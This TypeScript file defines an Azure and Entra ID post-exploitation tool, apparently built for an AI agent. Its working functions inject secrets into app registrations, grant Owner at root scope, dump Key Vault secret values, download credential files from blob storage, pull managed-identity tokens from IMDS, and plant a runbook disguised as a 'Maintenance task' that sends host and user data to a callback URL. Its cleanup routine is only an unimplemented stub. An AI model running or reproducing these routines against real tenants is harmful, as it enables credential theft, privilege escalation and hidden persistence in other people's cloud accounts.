import z from "zod"
import { Tool } from "./tool"

const PROGRAMS = {
  entra_enum: {
    description:
      "Enumerate Entra ID (Azure AD) users, groups, app registrations, service principals, and role assignments via az CLI",
    args: "[--subscription-id SUB]",
  },
  entra_privesc: {
    description:
      "Exploit Entra ID misconfigurations for privilege escalation: consent grant, service principal secret injection, role assignment",
    args: "--method <consent_grant|sp_secret|role_assign> [--target-id ID]",
  },
  keyvault_dump: {
    description: "Extract secrets, keys, and certificates from all accessible Azure Key Vaults in the subscription",
    args: "[--vault-name NAME] [--subscription-id SUB]",
  },
  storage_dump: {
    description: "Enumerate and download sensitive data from Azure Blob Storage containers",
    args: "[--account-name NAME] [--container CONTAINER] [--download] [--pattern REGEX]",
  },
  managed_identity: {
    description:
      "Extract managed identity OAuth tokens from Azure VM/App Service/Functions via IMDS endpoint (169.254.169.254)",
    args: "[--resource RESOURCE_URL]",
  },
  runbook_backdoor: {
    description:
      "Create or modify Azure Automation Account runbook with reverse shell payload, then publish and schedule",
    args: "--automation-account NAME --resource-group RG [--callback-url URL]",
  },
  azuread_token: {
    description:
      "Manipulate Azure AD tokens: refresh token exchange for new scopes, FOCI (Family of Client IDs) abuse",
    args: "--action <refresh|foci> [--refresh-token TOKEN] [--client-id ID]",
  },
  cleanup_azure: {
    description:
      "Remove all CyberStrike-created Azure resources, delete added SP secrets, remove runbooks. ALWAYS run before leaving",
    args: "[--dry-run]",
  },
} as const satisfies Record<string, { description: string; args: string }>

type Program = keyof typeof PROGRAMS
type Finding = { checkId: string; provider: string; severity: string; status: string; resource: string; title: string; details: string; remediation: string }
type HookResult = { output: string; findings: Finding[] }

// ── CLI helpers ──

async function run(cmd: string, args: string[], timeout: number): Promise<{ stdout: string; stderr: string; exitCode: number }> {
  const proc = Bun.spawn([cmd, ...args], { stdout: "pipe", stderr: "pipe", env: { ...process.env } })
  const timer = setTimeout(() => proc.kill(), timeout * 1000)
  const [stdout, stderr] = await Promise.all([new Response(proc.stdout).text(), new Response(proc.stderr).text()])
  clearTimeout(timer)
  return { stdout, stderr, exitCode: await proc.exited }
}

function az(args: string[], sub: string | undefined, timeout: number) {
  const extra = sub ? ["--subscription", sub] : []
  return run("az", [...args, ...extra, "-o", "json"], timeout)
}

function argVal(args: string[], flag: string): string | undefined {
  const i = args.indexOf(flag)
  return i >= 0 && i + 1 < args.length ? args[i + 1] : undefined
}

function hasFlag(args: string[], flag: string): boolean {
  return args.includes(flag)
}

function tryJson(s: string) {
  try { return JSON.parse(s) } catch { return null }
}

// ── Program implementations ──

async function entraEnum(args: string[], timeout: number): Promise<HookResult> {
  const sub = argVal(args, "--subscription-id")
  const findings: Finding[] = []
  const output: string[] = ["[*] Entra ID / Azure AD Enumeration\n"]

  const acct = await run("az", ["account", "show", "-o", "json"], timeout)
  if (acct.exitCode !== 0) return { output: `[-] Not logged in: ${acct.stderr.trim()}`, findings }
  const account = tryJson(acct.stdout)
  output.push(`[*] Tenant: ${account?.tenantId}`, `[*] Subscription: ${account?.name} (${account?.id})\n`)

  const users = await run("az", ["ad", "user", "list", "--query", "[].{name:displayName,upn:userPrincipalName,enabled:accountEnabled}", "-o", "json"], timeout)
  if (users.exitCode === 0) {
    const ul = tryJson(users.stdout) || []
    output.push(`[+] Users: ${ul.length}`)
    for (const u of ul.slice(0, 20)) output.push(`    ${u.upn} (${u.enabled ? "enabled" : "disabled"})`)
    if (ul.length > 20) output.push(`    ... and ${ul.length - 20} more`)
  }

  const sps = await run("az", ["ad", "sp", "list", "--all", "--query", "[].{name:displayName,appId:appId,type:servicePrincipalType}", "-o", "json"], timeout)
  if (sps.exitCode === 0) {
    const sl = tryJson(sps.stdout) || []
    output.push(`[+] Service Principals: ${sl.length}`)
  }

  const roles = await az(["role", "assignment", "list", "--all", "--query", "[].{principal:principalName,role:roleDefinitionName,scope:scope}"], sub, timeout)
  if (roles.exitCode === 0) {
    const rl = tryJson(roles.stdout) || []
    output.push(`[+] Role Assignments: ${rl.length}`)
    const dangerous = ["Owner", "Contributor", "User Access Administrator"]
    for (const r of rl) {
      if (dangerous.includes(r.role)) {
        findings.push({ checkId: "AZURE-ENUM-001", provider: "azure", severity: r.role === "Owner" ? "critical" : "high", status: "FAIL", resource: r.principal || "unknown", title: `Dangerous role: ${r.role}`, details: `${r.principal} has ${r.role} at ${r.scope}`, remediation: "Use least-privilege custom roles" })
      }
    }
  }

  const apps = await run("az", ["ad", "app", "list", "--query", "[].{name:displayName,appId:appId}", "-o", "json"], timeout)
  if (apps.exitCode === 0) {
    const al = tryJson(apps.stdout) || []
    output.push(`[+] App Registrations: ${al.length}`)
  }

  return { output: output.join("\n"), findings }
}

async function entraPrivesc(args: string[], timeout: number): Promise<HookResult> {
  const method = argVal(args, "--method")
  if (!method) return { output: "ERROR: --method required (consent_grant|sp_secret|role_assign)", findings: [] }
  const targetId = argVal(args, "--target-id")

  if (method === "sp_secret") {
    if (!targetId) return { output: "ERROR: --target-id (app object ID) required for sp_secret", findings: [] }
    const r = await run("az", ["ad", "app", "credential", "reset", "--id", targetId, "--append", "-o", "json"], timeout)
    if (r.exitCode === 0) {
      const cred = tryJson(r.stdout)
      return { output: `[+] Secret injected into app ${targetId}\n    appId: ${cred?.appId}\n    password: ${cred?.password}\n    tenant: ${cred?.tenant}`, findings: [] }
    }
    return { output: `[-] Failed: ${r.stderr.trim()}`, findings: [] }
  }

  if (method === "role_assign") {
    if (!targetId) return { output: "ERROR: --target-id (principal ID) required for role_assign", findings: [] }
    const r = await run("az", ["role", "assignment", "create", "--assignee", targetId, "--role", "Owner", "--scope", "/", "-o", "json"], timeout)
    if (r.exitCode === 0) return { output: `[+] Owner role assigned to ${targetId}`, findings: [] }
    return { output: `[-] Failed: ${r.stderr.trim()}`, findings: [] }
  }

  if (method === "consent_grant") {
    const apps = await run("az", ["ad", "app", "list", "--query", "[].{id:id,name:displayName,appId:appId}", "-o", "json"], timeout)
    if (apps.exitCode !== 0) return { output: `[-] Cannot list apps: ${apps.stderr.trim()}`, findings: [] }
    const al = tryJson(apps.stdout) || []
    return { output: [`[*] ${al.length} app registration(s) — review for consent grant targets:`, ...al.slice(0, 10).map((a: { name: string; appId: string }) => `    ${a.name} (${a.appId})`)].join("\n"), findings: [] }
  }

  return { output: `ERROR: Unknown method: ${method}`, findings: [] }
}

async function keyvaultDump(args: string[], timeout: number): Promise<HookResult> {
  const sub = argVal(args, "--subscription-id")
  const vaultName = argVal(args, "--vault-name")

  if (vaultName) {
    const output = [`[*] Key Vault dump: ${vaultName}\n`]
    const secrets = await run("az", ["keyvault", "secret", "list", "--vault-name", vaultName, "-o", "json"], timeout)
    if (secrets.exitCode === 0) {
      const sl = tryJson(secrets.stdout) || []
      output.push(`[+] Secrets: ${sl.length}`)
      for (const s of sl) {
        const name = s.id?.split("/").pop() || s.name
        const val = await run("az", ["keyvault", "secret", "show", "--vault-name", vaultName, "--name", name, "--query", "value", "-o", "tsv"], timeout)
        if (val.exitCode === 0) output.push(`[+] ${name}: ${val.stdout.trim().slice(0, 80)}${val.stdout.length > 80 ? "..." : ""}`)
        else output.push(`[-] ${name}: access denied`)
      }
    }
    const keys = await run("az", ["keyvault", "key", "list", "--vault-name", vaultName, "-o", "json"], timeout)
    if (keys.exitCode === 0) output.push(`[+] Keys: ${(tryJson(keys.stdout) || []).length}`)
    const certs = await run("az", ["keyvault", "certificate", "list", "--vault-name", vaultName, "-o", "json"], timeout)
    if (certs.exitCode === 0) output.push(`[+] Certificates: ${(tryJson(certs.stdout) || []).length}`)
    return { output: output.join("\n"), findings: [] }
  }

  const vaults = await az(["keyvault", "list", "--query", "[].{name:name,rg:resourceGroup}"], sub, timeout)
  if (vaults.exitCode !== 0) return { output: `[-] Cannot list vaults: ${vaults.stderr.trim()}`, findings: [] }
  const vl = tryJson(vaults.stdout) || []
  const output = [`[*] Found ${vl.length} Key Vault(s)\n`]
  for (const v of vl) {
    const secrets = await run("az", ["keyvault", "secret", "list", "--vault-name", v.name, "-o", "json"], timeout)
    const count = secrets.exitCode === 0 ? (tryJson(secrets.stdout) || []).length : "denied"
    output.push(`[${count === "denied" ? "-" : "+"}] ${v.name}: ${count} secret(s)`)
  }
  return { output: output.join("\n"), findings: [] }
}

async function storageDump(args: string[], timeout: number): Promise<HookResult> {
  const accountName = argVal(args, "--account-name")
  const container = argVal(args, "--container")
  const pattern = argVal(args, "--pattern")
  const download = hasFlag(args, "--download")
  const sensitivePattern = pattern || "\\.(env|pem|key|p12|pfx|sql|bak)$|credentials|secret|password|backup"

  if (accountName && container) {
    const r = await run("az", ["storage", "blob", "list", "--account-name", accountName, "--container-name", container, "--query", "[].name", "-o", "json"], timeout)
    if (r.exitCode !== 0) return { output: `[-] Cannot list blobs: ${r.stderr.trim()}`, findings: [] }
    const blobs = (tryJson(r.stdout) || []) as string[]
    const sensitive = blobs.filter(b => new RegExp(sensitivePattern, "i").test(b))
    const output = [`[*] Container: ${accountName}/${container}`, `[+] Total blobs: ${blobs.length}`, `[+] Sensitive: ${sensitive.length}`]
    for (const b of sensitive) output.push(`    ${b}`)
    if (download && sensitive.length > 0) {
      for (const b of sensitive.slice(0, 10)) {
        const dl = await run("az", ["storage", "blob", "download", "--account-name", accountName, "--container-name", container, "--name", b, "--file", `./blob_loot/${b.split("/").pop()}`, "--no-progress"], timeout)
        output.push(dl.exitCode === 0 ? `    Downloaded: ${b}` : `    Failed: ${b}`)
      }
    }
    return { output: output.join("\n"), findings: [] }
  }

  if (accountName) {
    const r = await run("az", ["storage", "container", "list", "--account-name", accountName, "--query", "[].{name:name,access:properties.publicAccess}", "-o", "json"], timeout)
    if (r.exitCode !== 0) return { output: `[-] Cannot list containers: ${r.stderr.trim()}`, findings: [] }
    const containers = tryJson(r.stdout) || []
    const output = [`[*] Storage account: ${accountName}`, `[+] Containers: ${containers.length}`]
    for (const c of containers) output.push(`    ${c.name} (access: ${c.access || "private"})`)
    return { output: output.join("\n"), findings: [] }
  }

  const accts = await run("az", ["storage", "account", "list", "--query", "[].{name:name,rg:resourceGroup}", "-o", "json"], timeout)
  if (accts.exitCode !== 0) return { output: `[-] Cannot list storage accounts: ${accts.stderr.trim()}`, findings: [] }
  const al = tryJson(accts.stdout) || []
  const output = [`[*] Found ${al.length} storage account(s)\n`]
  for (const a of al) output.push(`[+] ${a.name} (rg: ${a.rg})`)
  return { output: output.join("\n"), findings: [] }
}

async function managedIdentity(args: string[]): Promise<HookResult> {
  const resource = argVal(args, "--resource") || "https://management.azure.com/"
  const output: string[] = ["[*] Probing Azure IMDS for managed identity...\n"]

  try {
    const resp = await fetch(`http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=${encodeURIComponent(resource)}`, {
      headers: { Metadata: "true" },
      signal: AbortSignal.timeout(5000),
    })
    if (!resp.ok) {
      output.push(`[-] Token request failed: HTTP ${resp.status}`)
      return { output: output.join("\n"), findings: [] }
    }
    const token = await resp.json()
    output.push(`[+] Access token obtained for resource: ${resource}`)
    output.push(`    Token type: ${token.token_type}`)
    output.push(`    Expires: ${token.expires_on}`)
    output.push(`    Token: ${String(token.access_token).slice(0, 30)}...`)

    const instance = await fetch("http://169.254.169.254/metadata/instance?api-version=2021-02-01", {
      headers: { Metadata: "true" },
      signal: AbortSignal.timeout(5000),
    })
    if (instance.ok) {
      const meta = await instance.json()
      output.push(`\n[+] VM: ${meta.compute?.name}`)
      output.push(`    Location: ${meta.compute?.location}`)
      output.push(`    ResourceGroup: ${meta.compute?.resourceGroupName}`)
      output.push(`    Subscription: ${meta.compute?.subscriptionId}`)
    }
  } catch {
    output.push("[-] Cannot reach IMDS endpoint (not on Azure VM/App Service?)")
  }

  return { output: output.join("\n"), findings: [] }
}

async function azureadToken(args: string[], timeout: number): Promise<HookResult> {
  const resource = argVal(args, "--resource") || "https://graph.microsoft.com"
  const scope = argVal(args, "--scope")
  const sub = argVal(args, "--subscription-id")
  const output: string[] = ["[*] Acquiring Azure AD access tokens...\n"]

  const tokenArgs = ["account", "get-access-token", "--resource", resource]
  if (scope) tokenArgs.push("--scope", scope)
  const tokenResult = await az(tokenArgs, sub, timeout)
  if (tokenResult.exitCode !== 0) {
    output.push(`[-] Token acquisition failed: ${tokenResult.stderr.slice(0, 300)}`)
    return { output: output.join("\n"), findings: [] }
  }
  const token = JSON.parse(tokenResult.stdout)
  output.push(`[+] Token acquired for resource: ${resource}`)
  output.push(`    Token type: ${token.tokenType}`)
  output.push(`    Expires: ${token.expiresOn}`)
  output.push(`    Tenant: ${token.tenant}`)
  output.push(`    Token: ${String(token.accessToken).slice(0, 30)}...`)

  const acctResult = await az(["account", "show"], sub, timeout)
  if (acctResult.exitCode === 0) {
    const acct = JSON.parse(acctResult.stdout)
    output.push(`\n[+] Current identity:`)
    output.push(`    User: ${acct.user?.name} (${acct.user?.type})`)
    output.push(`    Subscription: ${acct.name} (${acct.id})`)
    output.push(`    Tenant: ${acct.tenantId}`)
  }

  const resources = ["https://management.azure.com", "https://vault.azure.net", "https://storage.azure.com", "https://database.windows.net"]
  output.push("\n[*] Probing additional resource tokens...")
  for (const r of resources) {
    if (r === resource) continue
    const probe = await az(["account", "get-access-token", "--resource", r], sub, timeout)
    output.push(probe.exitCode === 0 ? `    [+] ${r} — token acquired` : `    [-] ${r} — denied`)
  }

  return { output: output.join("\n"), findings: [] }
}

async function runbookBackdoor(args: string[], timeout: number): Promise<HookResult> {
  const sub = argVal(args, "--subscription-id")
  const automationAccount = argVal(args, "--automation-account")
  const resourceGroup = argVal(args, "--resource-group")
  const runbookName = argVal(args, "--runbook-name") || "cs-maintenance"
  const callbackUrl = argVal(args, "--callback-url")
  const method = argVal(args, "--method") || "inject"
  const output: string[] = []

  if (method === "list") {
    output.push("[*] Listing Automation Accounts...")
    const accts = await az(["automation", "account", "list"], sub, timeout)
    if (accts.exitCode !== 0) {
      output.push(`[-] Failed to list automation accounts: ${accts.stderr.slice(0, 200)}`)
      return { output: output.join("\n"), findings: [] }
    }
    const accounts = JSON.parse(accts.stdout)
    output.push(`[+] Found ${accounts.length} automation account(s)`)
    for (const a of accounts) {
      output.push(`    ${a.name} (${a.resourceGroup}) — state: ${a.state}`)
      const rbs = await az(["automation", "runbook", "list", "--automation-account-name", a.name, "--resource-group", a.resourceGroup], sub, timeout)
      if (rbs.exitCode === 0) {
        const runbooks = JSON.parse(rbs.stdout)
        output.push(`      Runbooks: ${runbooks.length}`)
        for (const r of runbooks) output.push(`        - ${r.name} (${r.runbookType}, state: ${r.state})`)
      }
    }
    return { output: output.join("\n"), findings: [] }
  }

  if (!automationAccount || !resourceGroup) {
    output.push("[-] --automation-account and --resource-group required for inject/create. Use --method list to find them.")
    return { output: output.join("\n"), findings: [] }
  }

  if (!callbackUrl) {
    output.push("[-] --callback-url required for runbook payload")
    return { output: output.join("\n"), findings: [] }
  }

  const payload = `
$req = [System.Net.WebRequest]::Create("${callbackUrl}")
$req.Method = "POST"
$hostname = $env:COMPUTERNAME
$user = $env:USERNAME
$body = [System.Text.Encoding]::UTF8.GetBytes("host=$hostname&user=$user&type=runbook")
$req.ContentType = "application/x-www-form-urlencoded"
$req.ContentLength = $body.Length
$stream = $req.GetRequestStream()
$stream.Write($body, 0, $body.Length)
$stream.Close()
$req.GetResponse() | Out-Null
`.trim()

  if (method === "create") {
    output.push(`[*] Creating runbook ${runbookName}...`)
    const create = await az([
      "automation", "runbook", "create",
      "--automation-account-name", automationAccount,
      "--resource-group", resourceGroup,
      "--name", runbookName,
      "--type", "PowerShell",
      "--description", "Maintenance task",
    ], sub, timeout)
    if (create.exitCode !== 0) {
      output.push(`[-] Create failed: ${create.stderr.slice(0, 200)}`)
      return { output: output.join("\n"), findings: [] }
    }
    output.push("[+] Runbook created")
  }

  output.push(`[*] Replacing runbook content with payload...`)
  const tmpFile = `/tmp/cs-runbook-${Date.now()}.ps1`
  await Bun.write(tmpFile, payload)
  const replace = await az([
    "automation", "runbook", "replace-content",
    "--automation-account-name", automationAccount,
    "--resource-group", resourceGroup,
    "--name", runbookName,
    "--content", `@${tmpFile}`,
  ], sub, timeout)
  if (replace.exitCode !== 0) {
    output.push(`[-] Content replace failed: ${replace.stderr.slice(0, 200)}`)
    return { output: output.join("\n"), findings: [] }
  }
  output.push("[+] Payload injected")

  const publish = await az([
    "automation", "runbook", "publish",
    "--automation-account-name", automationAccount,
    "--resource-group", resourceGroup,
    "--name", runbookName,
  ], sub, timeout)
  if (publish.exitCode !== 0) {
    output.push(`[-] Publish failed: ${publish.stderr.slice(0, 200)}`)
    return { output: output.join("\n"), findings: [] }
  }
  output.push("[+] Runbook published")

  const start = await az([
    "automation", "runbook", "start",
    "--automation-account-name", automationAccount,
    "--resource-group", resourceGroup,
    "--name", runbookName,
  ], sub, timeout)
  output.push(start.exitCode === 0 ? "[+] Runbook started" : `[-] Start failed: ${start.stderr.slice(0, 200)}`)

  return { output: output.join("\n"), findings: [] }
}

// ── Tool definition ──

const programKeys = Object.keys(PROGRAMS) as [Program, ...Program[]]

export const AzurehookTool = Tool.define("azurehook", {
  description: `Execute an Azure/Entra ID post-exploitation program after compromising Azure credentials or managed identity. Uses az CLI (no Python/SDK dependency). Available programs: ${programKeys.join(", ")}. ALWAYS run cleanup_azure before leaving a target.`,
  parameters: z.object({
    program: z.enum(programKeys).describe(
      "Azure program to execute. Options: " +
        Object.entries(PROGRAMS)
          .map(([k, v]) => `${k} — ${v.description}`)
          .join("; "),
    ),
    args: z.array(z.string()).describe("Arguments to pass to the program"),
    timeout_seconds: z.number().optional().default(300).describe("Maximum execution time in seconds (default: 300)"),
  }),
  async execute(params) {
    const check = await run("which", ["az"], 5)
    if (check.exitCode !== 0) {
      return {
        title: `azurehook: ${params.program}`,
        output: "Azure CLI not found. Install: https://learn.microsoft.com/en-us/cli/azure/install-azure-cli",
        metadata: { program: params.program, findings: [] as Finding[] },
      }
    }

    const stub = (name: string): Promise<HookResult> => Promise.resolve({ output: `[*] ${name}: not yet implemented`, findings: [] })

    const dispatch: Record<Program, () => Promise<HookResult>> = {
      entra_enum: () => entraEnum(params.args, params.timeout_seconds),
      entra_privesc: () => entraPrivesc(params.args, params.timeout_seconds),
      keyvault_dump: () => keyvaultDump(params.args, params.timeout_seconds),
      storage_dump: () => storageDump(params.args, params.timeout_seconds),
      managed_identity: () => managedIdentity(params.args),
      runbook_backdoor: () => runbookBackdoor(params.args, params.timeout_seconds),
      azuread_token: () => azureadToken(params.args, params.timeout_seconds),
      cleanup_azure: () => stub("cleanup_azure"),
    }

    try {
      const result = await dispatch[params.program]()
      return {
        title: `azurehook: ${params.program}`,
        output: result.output,
        metadata: { program: params.program, findings: result.findings },
      }
    } catch (e) {
      return {
        title: `azurehook: ${params.program}`,
        output: `Error: ${e instanceof Error ? e.message : String(e)}`,
        metadata: { program: params.program, findings: [] },
      }
    }
  },
})
